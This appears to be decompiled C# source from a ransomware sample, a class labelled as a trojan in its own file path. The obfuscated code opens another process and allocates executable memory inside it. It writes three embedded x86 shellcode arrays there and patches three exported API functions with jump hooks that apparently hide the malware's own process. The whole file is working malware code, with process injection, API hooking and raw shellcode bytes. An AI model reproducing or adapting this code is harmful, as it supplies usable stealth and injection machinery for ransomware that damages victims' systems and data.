// Decompiled with JetBrains decompiler
// Type: jtIfSSnqxRh.eUjidLgYebd
// Assembly: Client-0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B8444C5B-FCC9-4B9F-A06C-7304BA49E3C5
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Ransom.Win32.Generic-1d4db8733c5f11ee8fca530aeb4a91069de04b1af64cbe1fa3ae2d3572a6e554.exe

using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace jtIfSSnqxRh
{
  internal sealed class eUjidLgYebd
  {
    private static byte[] nctYPphqslwL;
    private static byte[] ztuSToAgDGDYd;
    private static byte[] fiYMiUvkRvg;
    [NonSerialized]
    internal static GetString \u0003;

    [DllImport("kernel32", EntryPoint = "CloseHandle", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern bool eMdyWTPVPlX([In] IntPtr obj0);

    [DllImport("kernel32", EntryPoint = "OpenProcess", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern IntPtr FZsPmsKqghlRkGY([In] int obj0, [In] bool obj1, [In] uint obj2);

    [DllImport("kernel32", EntryPoint = "ReadProcessMemory", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern bool LmvAcdVuomt(
      IntPtr VYrRjARUFmI,
      IntPtr wuAodEIVARvFspA,
      [Out] byte[] DChmdhIbTai,
      uint BBNpqWFfOBG,
      ref uint uGTmqTHxSAJ);

    [DllImport("kernel32", EntryPoint = "WriteProcessMemory", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern bool PkEpcqqTWKo(
      [In] IntPtr obj0,
      [In] IntPtr obj1,
      [In] byte[] obj2,
      [In] uint obj3,
      [In] ref uint obj4);

    [DllImport("kernel32", EntryPoint = "VirtualProtectEx", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern bool MCdrxqpLnDIJ(
      [In] IntPtr obj0,
      [In] IntPtr obj1,
      [In] uint obj2,
      [In] uint obj3,
      [In] ref uint obj4);

    [DllImport("kernel32", EntryPoint = "Module32Next", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern bool BLyNtshbFUt([In] IntPtr obj0, [In] ref eUjidLgYebd.sfYERjZORgUff obj1);

    [DllImport("kernel32", EntryPoint = "Module32First", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern bool WyiYtSYCKdl([In] IntPtr obj0, [In] ref eUjidLgYebd.sfYERjZORgUff obj1);

    [DllImport("kernel32", EntryPoint = "CreateToolhelp32Snapshot", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern IntPtr KOpEfGVJeCrg([In] uint obj0, [In] uint obj1);

    [DllImport("kernel32", EntryPoint = "VirtualAllocEx", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern IntPtr NWehzOunaWE(
      [In] IntPtr obj0,
      [In] IntPtr obj1,
      [In] uint obj2,
      [In] uint obj3,
      [In] uint obj4);

    private static byte[] umKlAfyNOPmLY([In] IntPtr obj0, [In] IntPtr obj1, [In] uint obj2)
    {
      byte[] numArray = new byte[checked ((int) ((ulong) obj2 - 1UL) + 1)];
      byte[] DChmdhIbTai = numArray;
      uint uGTmqTHxSAJ = 0;
      eUjidLgYebd.LmvAcdVuomt(obj0, obj1, DChmdhIbTai, obj2, ref uGTmqTHxSAJ);
      return numArray;
    }

    private static uint CYbThQUQFjnn([In] IntPtr obj0, [In] uint obj1, [In] string obj2)
    {
      uint uint32_1 = BitConverter.ToUInt32(eUjidLgYebd.umKlAfyNOPmLY(obj0, (IntPtr) checked ((long) ((ulong) obj1 + 60UL)), 4U), 0);
      uint uint32_2 = BitConverter.ToUInt32(eUjidLgYebd.umKlAfyNOPmLY(obj0, (IntPtr) checked ((long) ((ulong) (obj1 + uint32_1) + 120UL)), 4U), 0);
      byte[] numArray = eUjidLgYebd.umKlAfyNOPmLY(obj0, (IntPtr) (long) checked (obj1 + uint32_2), 40U);
      int int32 = BitConverter.ToInt32(numArray, 24);
      uint num1 = checked (BitConverter.ToUInt32(numArray, 32) + obj1);
      uint num2 = checked (BitConverter.ToUInt32(numArray, 28) + obj1);
      uint num3 = checked (BitConverter.ToUInt32(numArray, 36) + obj1);
      IntPtr num4 = Marshal.AllocHGlobal(64);
      int num5 = 1;
      int num6 = int32;
      int num7 = num5;
      while (num7 <= num6)
      {
        uint uint32_3 = BitConverter.ToUInt32(eUjidLgYebd.umKlAfyNOPmLY(obj0, (IntPtr) checked ((long) ((ulong) num1 + (ulong) ((num7 - 1) * 4))), 4U), 0);
        Marshal.Copy(eUjidLgYebd.umKlAfyNOPmLY(obj0, (IntPtr) (long) checked (obj1 + uint32_3), 64U), 0, num4, 64);
        string stringAnsi = Marshal.PtrToStringAnsi(num4);
        uint int16 = checked ((uint) BitConverter.ToInt16(eUjidLgYebd.umKlAfyNOPmLY(obj0, (IntPtr) (long) ((ulong) num3 + (ulong) ((num7 - 1) * 2)), 2U), 0));
        uint num8 = checked (BitConverter.ToUInt32(eUjidLgYebd.umKlAfyNOPmLY(obj0, (IntPtr) (long) ((ulong) num2 + (ulong) int16 * 4UL), 4U), 0) + obj1);
        if (string.Compare(stringAnsi, obj2, true) != 0)
        {
          checked { ++num7; }
        }
        else
        {
          Marshal.FreeHGlobal(num4);
          return num8;
        }
      }
      Marshal.FreeHGlobal(num4);
      return 0;
    }

    private static IntPtr RLvTzJHDoBLqail([In] string obj0, [In] string obj1)
    {
      IntPtr num1 = eUjidLgYebd.KOpEfGVJeCrg(24U, checked ((uint) Process.GetProcessesByName(obj0)[0].Id));
      IntPtr zero = IntPtr.Zero;
      IntPtr num2;
      if (num1 == zero)
      {
        num2 = zero;
      }
      else
      {
        eUjidLgYebd.sfYERjZORgUff structure = new eUjidLgYebd.sfYERjZORgUff();
        structure.htbsOdCPHlS = checked ((uint) Marshal.SizeOf<eUjidLgYebd.sfYERjZORgUff>(structure));
        if (eUjidLgYebd.WyiYtSYCKdl(num1, ref structure))
        {
          while (structure.qVdAnecQamwPR.ToInt64() > (long) int.MaxValue || string.Compare(obj1, structure.yKBVvVfceUnzB, true) != 0)
          {
            if (!eUjidLgYebd.BLyNtshbFUt(num1, ref structure))
              goto label_6;
          }
          return structure.qVdAnecQamwPR;
        }
label_6:
        num2 = zero;
      }
      return num2;
    }

    private static int LBKSZeTtHSF([In] int obj0, [In] int obj1) => checked (obj0 - obj1 - 5);

    public static void AFZSatJIOWJlK([In] string obj0)
    {
      byte[] numArray1 = new byte[97];
      uint[] numArray2 = new uint[4];
      byte[][] numArray3 = new byte[4][];
      uint num1 = 0;
      byte[] numArray4 = new byte[5]
      {
        (byte) 233,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0
      };
      byte[][] numArray5 = new byte[3][]
      {
        eUjidLgYebd.nctYPphqslwL,
        eUjidLgYebd.ztuSToAgDGDYd,
        eUjidLgYebd.fiYMiUvkRvg
      };
      uint num2 = checked ((uint) (numArray5[0].Length + numArray5[1].Length + numArray5[2].Length));
      IntPtr num3 = eUjidLgYebd.FZsPmsKqghlRkGY(56, false, checked ((uint) Process.GetProcessesByName(obj0)[0].Id));
      IntPtr zero = IntPtr.Zero;
      uint num4 = checked ((uint) (int) eUjidLgYebd.NWehzOunaWE(num3, zero, (uint) ((ulong) num2 + 96UL), 12288U, 64U));
      uint num5 = checked ((uint) (int) eUjidLgYebd.CYbThQUQFjnn(num3, (uint) (int) eUjidLgYebd.RLvTzJHDoBLqail(obj0, eUjidLgYebd.\u0003(107366467)), eUjidLgYebd.\u0003(107366450)));
      uint num6 = checked ((uint) (int) eUjidLgYebd.CYbThQUQFjnn(num3, (uint) (int) eUjidLgYebd.RLvTzJHDoBLqail(obj0, eUjidLgYebd.\u0003(107366467)), eUjidLgYebd.\u0003(107366401)));
      numArray2[0] = checked ((uint) (int) eUjidLgYebd.CYbThQUQFjnn(num3, (uint) (int) eUjidLgYebd.RLvTzJHDoBLqail(obj0, eUjidLgYebd.\u0003(107366404)), eUjidLgYebd.\u0003(107365847)));
      numArray2[1] = checked ((uint) (int) eUjidLgYebd.CYbThQUQFjnn(num3, (uint) (int) eUjidLgYebd.RLvTzJHDoBLqail(obj0, eUjidLgYebd.\u0003(107366404)), eUjidLgYebd.\u0003(107365818)));
      numArray2[2] = checked ((uint) (int) eUjidLgYebd.CYbThQUQFjnn(num3, (uint) (int) eUjidLgYebd.RLvTzJHDoBLqail(obj0, eUjidLgYebd.\u0003(107366404)), eUjidLgYebd.\u0003(107365829)));
      numArray3[0] = eUjidLgYebd.umKlAfyNOPmLY(num3, (IntPtr) (long) numArray2[0], 24U);
      numArray3[1] = eUjidLgYebd.umKlAfyNOPmLY(num3, (IntPtr) (long) numArray2[1], 24U);
      numArray3[2] = eUjidLgYebd.umKlAfyNOPmLY(num3, (IntPtr) (long) numArray2[2], 24U);
      BitConverter.GetBytes(num5).CopyTo((Array) numArray1, 0);
      BitConverter.GetBytes(num6).CopyTo((Array) numArray1, 4);
      BitConverter.GetBytes(Process.GetCurrentProcess().Id).CopyTo((Array) numArray1, 8);
      BitConverter.GetBytes(numArray2[0]).CopyTo((Array) numArray1, 12);
      BitConverter.GetBytes(numArray2[1]).CopyTo((Array) numArray1, 16);
      BitConverter.GetBytes(numArray2[2]).CopyTo((Array) numArray1, 20);
      numArray3[0].CopyTo((Array) numArray1, 24);
      numArray3[1].CopyTo((Array) numArray1, 48);
      numArray3[2].CopyTo((Array) numArray1, 72);
      uint num7 = num4;
      IntPtr num8 = num3;
      IntPtr num9 = (IntPtr) (long) num7;
      byte[] numArray6 = numArray1;
      uint num10 = 96;
      uint num11 = 0;
      eUjidLgYebd.PkEpcqqTWKo(num8, num9, numArray6, num10, ref num11);
      uint num12 = checked ((uint) ((ulong) num7 + 96UL));
      int num13 = 0;
      int num14 = checked (numArray5.Length - 1);
      int index = num13;
      while (index <= num14)
      {
        IntPtr num15 = num3;
        IntPtr num16 = (IntPtr) (long) num12;
        byte[] numArray7 = numArray5[index];
        uint length = checked ((uint) numArray5[index].Length);
        uint num17 = 0;
        eUjidLgYebd.PkEpcqqTWKo(num15, num16, numArray7, length, ref num17);
        num12 = checked ((uint) ((ulong) num12 + (ulong) numArray5[index].Length));
        checked { ++index; }
      }
      IntPtr num18 = num3;
      IntPtr num19 = (IntPtr) (long) num4;
      uint num20 = checked ((uint) ((ulong) num2 + 96UL));
      uint num21 = 16;
      uint num22 = 0;
      eUjidLgYebd.MCdrxqpLnDIJ(num18, num19, num20, num21, ref num22);
      uint num23 = checked ((uint) ((ulong) num4 + 96UL));
      BitConverter.GetBytes(eUjidLgYebd.LBKSZeTtHSF(checked ((int) num23), checked ((int) numArray2[0]))).CopyTo((Array) numArray4, 1);
      eUjidLgYebd.MCdrxqpLnDIJ(num3, (IntPtr) (long) numArray2[0], checked ((uint) numArray4.Length), 64U, ref num1);
      IntPtr num24 = num3;
      IntPtr num25 = (IntPtr) (long) numArray2[0];
      byte[] numArray8 = numArray4;
      uint length1 = checked ((uint) numArray4.Length);
      num22 = 0U;
      eUjidLgYebd.PkEpcqqTWKo(num24, num25, numArray8, length1, ref num22);
      IntPtr num26 = num3;
      IntPtr num27 = (IntPtr) (long) numArray2[0];
      uint length2 = checked ((uint) numArray4.Length);
      uint num28 = num1;
      num22 = 0U;
      eUjidLgYebd.MCdrxqpLnDIJ(num26, num27, length2, num28, ref num22);
      uint num29 = checked ((uint) ((ulong) num23 + (ulong) numArray5[0].Length));
      BitConverter.GetBytes(eUjidLgYebd.LBKSZeTtHSF(checked ((int) num29), checked ((int) numArray2[1]))).CopyTo((Array) numArray4, 1);
      eUjidLgYebd.MCdrxqpLnDIJ(num3, (IntPtr) (long) numArray2[1], checked ((uint) numArray4.Length), 64U, ref num1);
      IntPtr num30 = num3;
      IntPtr num31 = (IntPtr) (long) numArray2[1];
      byte[] numArray9 = numArray4;
      uint length3 = checked ((uint) numArray4.Length);
      num22 = 0U;
      eUjidLgYebd.PkEpcqqTWKo(num30, num31, numArray9, length3, ref num22);
      IntPtr num32 = num3;
      IntPtr num33 = (IntPtr) (long) numArray2[1];
      uint length4 = checked ((uint) numArray4.Length);
      uint num34 = num1;
      num22 = 0U;
      eUjidLgYebd.MCdrxqpLnDIJ(num32, num33, length4, num34, ref num22);
      BitConverter.GetBytes(eUjidLgYebd.LBKSZeTtHSF(checked ((int) (uint) ((ulong) num29 + (ulong) numArray5[1].Length)), checked ((int) numArray2[2]))).CopyTo((Array) numArray4, 1);
      eUjidLgYebd.MCdrxqpLnDIJ(num3, (IntPtr) (long) numArray2[2], checked ((uint) numArray4.Length), 64U, ref num1);
      IntPtr num35 = num3;
      IntPtr num36 = (IntPtr) (long) numArray2[2];
      byte[] numArray10 = numArray4;
      uint length5 = checked ((uint) numArray4.Length);
      num22 = 0U;
      eUjidLgYebd.PkEpcqqTWKo(num35, num36, numArray10, length5, ref num22);
      IntPtr num37 = num3;
      IntPtr num38 = (IntPtr) (long) numArray2[2];
      uint length6 = checked ((uint) numArray4.Length);
      uint num39 = num1;
      num22 = 0U;
      eUjidLgYebd.MCdrxqpLnDIJ(num37, num38, length6, num39, ref num22);
      eUjidLgYebd.eMdyWTPVPlX(num3);
    }

    static eUjidLgYebd()
    {
      Strings.CreateGetStringDelegate(typeof (eUjidLgYebd));
      eUjidLgYebd.nctYPphqslwL = new byte[240]
      {
        (byte) 85,
        (byte) 139,
        (byte) 236,
        (byte) 131,
        (byte) 236,
        (byte) 20,
        (byte) 86,
        (byte) 199,
        (byte) 69,
        (byte) 248,
        (byte) 1,
        (byte) 0,
        (byte) 0,
        (byte) 192,
        (byte) 232,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 88,
        (byte) 37,
        (byte) 0,
        (byte) 240,
        byte.MaxValue,
        byte.MaxValue,
        (byte) 137,
        (byte) 69,
        (byte) 252,
        byte.MaxValue,
        (byte) 117,
        (byte) 24,
        byte.MaxValue,
        (byte) 117,
        (byte) 20,
        byte.MaxValue,
        (byte) 117,
        (byte) 16,
        byte.MaxValue,
        (byte) 117,
        (byte) 12,
        byte.MaxValue,
        (byte) 117,
        (byte) 8,
        (byte) 139,
        (byte) 69,
        (byte) 252,
        (byte) 131,
        (byte) 192,
        (byte) 24,
        byte.MaxValue,
        (byte) 208,
        (byte) 137,
        (byte) 69,
        (byte) 248,
        (byte) 131,
        (byte) 125,
        (byte) 248,
        (byte) 0,
        (byte) 15,
        (byte) 140,
        (byte) 168,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        byte.MaxValue,
        (byte) 117,
        (byte) 8,
        (byte) 139,
        (byte) 69,
        (byte) 252,
        byte.MaxValue,
        (byte) 16,
        (byte) 139,
        (byte) 240,
        (byte) 139,
        (byte) 69,
        (byte) 252,
        byte.MaxValue,
        (byte) 80,
        (byte) 4,
        (byte) 59,
        (byte) 240,
        (byte) 116,
        (byte) 10,
        (byte) 131,
        (byte) 125,
        (byte) 8,
        byte.MaxValue,
        (byte) 15,
        (byte) 133,
        (byte) 138,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 131,
        (byte) 101,
        (byte) 244,
        (byte) 0,
        (byte) 235,
        (byte) 7,
        (byte) 139,
        (byte) 69,
        (byte) 244,
        (byte) 64,
        (byte) 137,
        (byte) 69,
        (byte) 244,
        (byte) 131,
        (byte) 125,
        (byte) 244,
        (byte) 3,
        (byte) 115,
        (byte) 119,
        (byte) 139,
        (byte) 69,
        (byte) 244,
        (byte) 139,
        (byte) 77,
        (byte) 252,
        (byte) 131,
        (byte) 124,
        (byte) 129,
        (byte) 12,
        (byte) 0,
        (byte) 116,
        (byte) 101,
        (byte) 139,
        (byte) 69,
        (byte) 244,
        (byte) 139,
        (byte) 77,
        (byte) 252,
        (byte) 139,
        (byte) 68,
        (byte) 129,
        (byte) 12,
        (byte) 59,
        (byte) 69,
        (byte) 12,
        (byte) 114,
        (byte) 86,
        (byte) 139,
        (byte) 69,
        (byte) 12,
        (byte) 3,
        (byte) 69,
        (byte) 20,
        (byte) 139,
        (byte) 77,
        (byte) 244,
        (byte) 139,
        (byte) 85,
        (byte) 252,
        (byte) 57,
        (byte) 68,
        (byte) 138,
        (byte) 12,
        (byte) 115,
        (byte) 68,
        (byte) 139,
        (byte) 69,
        (byte) 244,
        (byte) 139,
        (byte) 77,
        (byte) 252,
        (byte) 139,
        (byte) 68,
        (byte) 129,
        (byte) 12,
        (byte) 43,
        (byte) 69,
        (byte) 12,
        (byte) 137,
        (byte) 69,
        (byte) 240,
        (byte) 131,
        (byte) 101,
        (byte) 236,
        (byte) 0,
        (byte) 235,
        (byte) 7,
        (byte) 139,
        (byte) 69,
        (byte) 236,
        (byte) 64,
        (byte) 137,
        (byte) 69,
        (byte) 236,
        (byte) 131,
        (byte) 125,
        (byte) 236,
        (byte) 24,
        (byte) 115,
        (byte) 33,
        (byte) 139,
        (byte) 69,
        (byte) 244,
        (byte) 107,
        (byte) 192,
        (byte) 24,
        (byte) 139,
        (byte) 77,
        (byte) 252,
        (byte) 141,
        (byte) 68,
        (byte) 1,
        (byte) 24,
        (byte) 139,
        (byte) 77,
        (byte) 236,
        (byte) 3,
        (byte) 77,
        (byte) 240,
        (byte) 139,
        (byte) 85,
        (byte) 16,
        (byte) 139,
        (byte) 117,
        (byte) 236,
        (byte) 138,
        (byte) 4,
        (byte) 48,
        (byte) 136,
        (byte) 4,
        (byte) 10,
        (byte) 235,
        (byte) 210,
        (byte) 233,
        (byte) 124,
        byte.MaxValue,
        byte.MaxValue,
        byte.MaxValue,
        (byte) 139,
        (byte) 69,
        (byte) 248,
        (byte) 94,
        (byte) 201,
        (byte) 194,
        (byte) 20,
        (byte) 0
      };
      eUjidLgYebd.ztuSToAgDGDYd = new byte[84]
      {
        (byte) 85,
        (byte) 139,
        (byte) 236,
        (byte) 81,
        (byte) 81,
        (byte) 199,
        (byte) 69,
        (byte) 248,
        (byte) 1,
        (byte) 0,
        (byte) 0,
        (byte) 192,
        (byte) 232,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 88,
        (byte) 37,
        (byte) 0,
        (byte) 240,
        byte.MaxValue,
        byte.MaxValue,
        (byte) 137,
        (byte) 69,
        (byte) 252,
        (byte) 131,
        (byte) 125,
        (byte) 20,
        (byte) 0,
        (byte) 116,
        (byte) 22,
        (byte) 139,
        (byte) 69,
        (byte) 20,
        (byte) 139,
        (byte) 77,
        (byte) 252,
        (byte) 139,
        (byte) 0,
        (byte) 59,
        (byte) 65,
        (byte) 8,
        (byte) 117,
        (byte) 9,
        (byte) 199,
        (byte) 69,
        (byte) 248,
        (byte) 34,
        (byte) 0,
        (byte) 0,
        (byte) 192,
        (byte) 235,
        (byte) 23,
        byte.MaxValue,
        (byte) 117,
        (byte) 20,
        byte.MaxValue,
        (byte) 117,
        (byte) 16,
        byte.MaxValue,
        (byte) 117,
        (byte) 12,
        byte.MaxValue,
        (byte) 117,
        (byte) 8,
        (byte) 139,
        (byte) 69,
        (byte) 252,
        (byte) 131,
        (byte) 192,
        (byte) 48,
        byte.MaxValue,
        (byte) 208,
        (byte) 137,
        (byte) 69,
        (byte) 248,
        (byte) 139,
        (byte) 69,
        (byte) 248,
        (byte) 201,
        (byte) 194,
        (byte) 16,
        (byte) 0
      };
      eUjidLgYebd.fiYMiUvkRvg = new byte[405]
      {
        (byte) 85,
        (byte) 139,
        (byte) 236,
        (byte) 131,
        (byte) 236,
        (byte) 28,
        (byte) 86,
        (byte) 87,
        (byte) 199,
        (byte) 69,
        (byte) 236,
        (byte) 1,
        (byte) 0,
        (byte) 0,
        (byte) 192,
        (byte) 232,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 88,
        (byte) 37,
        (byte) 0,
        (byte) 240,
        byte.MaxValue,
        byte.MaxValue,
        (byte) 137,
        (byte) 69,
        (byte) 240,
        byte.MaxValue,
        (byte) 117,
        (byte) 20,
        byte.MaxValue,
        (byte) 117,
        (byte) 16,
        byte.MaxValue,
        (byte) 117,
        (byte) 12,
        byte.MaxValue,
        (byte) 117,
        (byte) 8,
        (byte) 139,
        (byte) 69,
        (byte) 240,
        (byte) 131,
        (byte) 192,
        (byte) 72,
        byte.MaxValue,
        (byte) 208,
        (byte) 137,
        (byte) 69,
        (byte) 236,
        (byte) 131,
        (byte) 125,
        (byte) 236,
        (byte) 0,
        (byte) 15,
        (byte) 140,
        (byte) 78,
        (byte) 1,
        (byte) 0,
        (byte) 0,
        (byte) 131,
        (byte) 125,
        (byte) 8,
        (byte) 5,
        (byte) 117,
        (byte) 93,
        (byte) 131,
        (byte) 101,
        (byte) 248,
        (byte) 0,
        (byte) 139,
        (byte) 69,
        (byte) 12,
        (byte) 137,
        (byte) 69,
        (byte) 244,
        (byte) 139,
        (byte) 69,
        (byte) 244,
        (byte) 131,
        (byte) 56,
        (byte) 0,
        (byte) 116,
        (byte) 70,
        (byte) 139,
        (byte) 69,
        (byte) 244,
        (byte) 137,
        (byte) 69,
        (byte) 248,
        (byte) 139,
        (byte) 69,
        (byte) 248,
        (byte) 139,
        (byte) 77,
        (byte) 248,
        (byte) 3,
        (byte) 8,
        (byte) 137,
        (byte) 77,
        (byte) 244,
        (byte) 139,
        (byte) 69,
        (byte) 244,
        (byte) 139,
        (byte) 77,
        (byte) 240,
        (byte) 139,
        (byte) 64,
        (byte) 68,
        (byte) 59,
        (byte) 65,
        (byte) 8,
        (byte) 117,
        (byte) 37,
        (byte) 139,
        (byte) 69,
        (byte) 244,
        (byte) 131,
        (byte) 56,
        (byte) 0,
        (byte) 117,
        (byte) 8,
        (byte) 139,
        (byte) 69,
        (byte) 248,
        (byte) 131,
        (byte) 32,
        (byte) 0,
        (byte) 235,
        (byte) 15,
        (byte) 139,
        (byte) 69,
        (byte) 248,
        (byte) 139,
        (byte) 0,
        (byte) 139,
        (byte) 77,
        (byte) 244,
        (byte) 3,
        (byte) 1,
        (byte) 139,
        (byte) 77,
        (byte) 248,
        (byte) 137,
        (byte) 1,
        (byte) 139,
        (byte) 69,
        (byte) 248,
        (byte) 137,
        (byte) 69,
        (byte) 244,
        (byte) 235,
        (byte) 178,
        (byte) 233,
        (byte) 235,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 131,
        (byte) 125,
        (byte) 8,
        (byte) 16,
        (byte) 15,
        (byte) 133,
        (byte) 225,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 139,
        (byte) 69,
        (byte) 12,
        (byte) 137,
        (byte) 69,
        (byte) 252,
        (byte) 131,
        (byte) 101,
        (byte) 232,
        (byte) 0,
        (byte) 235,
        (byte) 7,
        (byte) 139,
        (byte) 69,
        (byte) 232,
        (byte) 64,
        (byte) 137,
        (byte) 69,
        (byte) 232,
        (byte) 139,
        (byte) 69,
        (byte) 252,
        (byte) 139,
        (byte) 77,
        (byte) 232,
        (byte) 59,
        (byte) 8,
        (byte) 15,
        (byte) 131,
        (byte) 192,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 139,
        (byte) 69,
        (byte) 232,
        (byte) 193,
        (byte) 224,
        (byte) 4,
        (byte) 139,
        (byte) 77,
        (byte) 252,
        (byte) 139,
        (byte) 85,
        (byte) 240,
        (byte) 139,
        (byte) 68,
        (byte) 1,
        (byte) 4,
        (byte) 59,
        (byte) 66,
        (byte) 8,
        (byte) 15,
        (byte) 133,
        (byte) 162,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 139,
        (byte) 69,
        (byte) 232,
        (byte) 193,
        (byte) 224,
        (byte) 4,
        (byte) 139,
        (byte) 77,
        (byte) 252,
        (byte) 198,
        (byte) 68,
        (byte) 1,
        (byte) 9,
        (byte) 0,
        (byte) 139,
        (byte) 69,
        (byte) 232,
        (byte) 193,
        (byte) 224,
        (byte) 4,
        (byte) 139,
        (byte) 77,
        (byte) 252,
        (byte) 131,
        (byte) 100,
        (byte) 1,
        (byte) 16,
        (byte) 0,
        (byte) 139,
        (byte) 69,
        (byte) 232,
        (byte) 193,
        (byte) 224,
        (byte) 4,
        (byte) 51,
        (byte) 201,
        (byte) 139,
        (byte) 85,
        (byte) 252,
        (byte) 102,
        (byte) 137,
        (byte) 76,
        (byte) 2,
        (byte) 10,
        (byte) 139,
        (byte) 69,
        (byte) 232,
        (byte) 193,
        (byte) 224,
        (byte) 4,
        (byte) 139,
        (byte) 77,
        (byte) 252,
        (byte) 131,
        (byte) 100,
        (byte) 1,
        (byte) 12,
        (byte) 0,
        (byte) 139,
        (byte) 69,
        (byte) 232,
        (byte) 193,
        (byte) 224,
        (byte) 4,
        (byte) 139,
        (byte) 77,
        (byte) 252,
        (byte) 198,
        (byte) 68,
        (byte) 1,
        (byte) 8,
        (byte) 0,
        (byte) 139,
        (byte) 69,
        (byte) 232,
        (byte) 193,
        (byte) 224,
        (byte) 4,
        (byte) 139,
        (byte) 77,
        (byte) 252,
        (byte) 131,
        (byte) 100,
        (byte) 1,
        (byte) 4,
        (byte) 0,
        (byte) 139,
        (byte) 69,
        (byte) 232,
        (byte) 137,
        (byte) 69,
        (byte) 228,
        (byte) 235,
        (byte) 7,
        (byte) 139,
        (byte) 69,
        (byte) 228,
        (byte) 64,
        (byte) 137,
        (byte) 69,
        (byte) 228,
        (byte) 139,
        (byte) 69,
        (byte) 252,
        (byte) 139,
        (byte) 77,
        (byte) 228,
        (byte) 59,
        (byte) 8,
        (byte) 115,
        (byte) 33,
        (byte) 139,
        (byte) 69,
        (byte) 228,
        (byte) 64,
        (byte) 193,
        (byte) 224,
        (byte) 4,
        (byte) 139,
        (byte) 77,
        (byte) 252,
        (byte) 141,
        (byte) 116,
        (byte) 1,
        (byte) 4,
        (byte) 139,
        (byte) 69,
        (byte) 228,
        (byte) 193,
        (byte) 224,
        (byte) 4,
        (byte) 139,
        (byte) 77,
        (byte) 252,
        (byte) 141,
        (byte) 124,
        (byte) 1,
        (byte) 4,
        (byte) 165,
        (byte) 165,
        (byte) 165,
        (byte) 165,
        (byte) 235,
        (byte) 206,
        (byte) 139,
        (byte) 69,
        (byte) 252,
        (byte) 139,
        (byte) 0,
        (byte) 72,
        (byte) 139,
        (byte) 77,
        (byte) 252,
        (byte) 137,
        (byte) 1,
        (byte) 139,
        (byte) 69,
        (byte) 232,
        (byte) 72,
        (byte) 137,
        (byte) 69,
        (byte) 232,
        (byte) 233,
        (byte) 43,
        byte.MaxValue,
        byte.MaxValue,
        byte.MaxValue,
        (byte) 139,
        (byte) 69,
        (byte) 236,
        (byte) 95,
        (byte) 94,
        (byte) 201,
        (byte) 194,
        (byte) 16,
        (byte) 0
      };
    }

    public struct sfYERjZORgUff
    {
      public uint htbsOdCPHlS;
      public uint lceJHBFZghS;
      public uint vZUCkvrsswgYwp;
      public uint cAkNANgOHn;
      public uint rPAIgUAwRrqO;
      public IntPtr qVdAnecQamwPR;
      public uint cSbaujTKTSuXy;
      public IntPtr QIeeoHzVIzv;
      [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 256)]
      public string yKBVvVfceUnzB;
      [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
      public string fDgyUVbKjQXUzQk;
    }
  }
}
